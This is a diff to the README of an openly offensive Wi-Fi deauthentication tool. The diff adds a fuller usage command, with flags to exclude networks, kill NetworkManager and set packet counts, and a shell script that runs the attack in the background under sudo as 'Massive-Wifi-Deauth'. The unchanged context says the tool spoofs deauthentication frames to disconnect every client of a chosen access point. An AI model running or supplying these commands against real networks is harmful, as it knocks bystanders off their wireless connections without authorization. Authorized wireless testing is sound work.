@@ -22,9 +22,20 @@ After the attacker chooses a target access point to attack, the program:
 2. Starts sniffing for clients that are connected to the AP by filtering for certain 802.11 packet frames and sending spoofed deauthentication packets to those clients in addition to the broadcast address
 
 
-# Usage
+# Usage example
 ```bash
-python3 wifi-deauth.py -i <iface>
+python3 wifi-deauth.py -i wlan0  -e exclude_bssid.txt -k -t 10 -n 100
+-e file ssid list to exclude
+-k kill networkmanager
+-t time of learning client mac addres
+-n number of the authentication packets
+```
+# Bash script to running in backgroud.
+```bash
+#!/bin/sh
+echo Starting Massive-Wifi-Deauth
+DISPLAY=:0 exec  xterm -e "cd /home/kali/Desktop/wifi-deauth/;sudo python3 wifi-deauth.py -i wlan0  -e exclude_bssid.txt -k -t 10 -n 100" &
+exit 0
 ```
 
 ### Usage notes
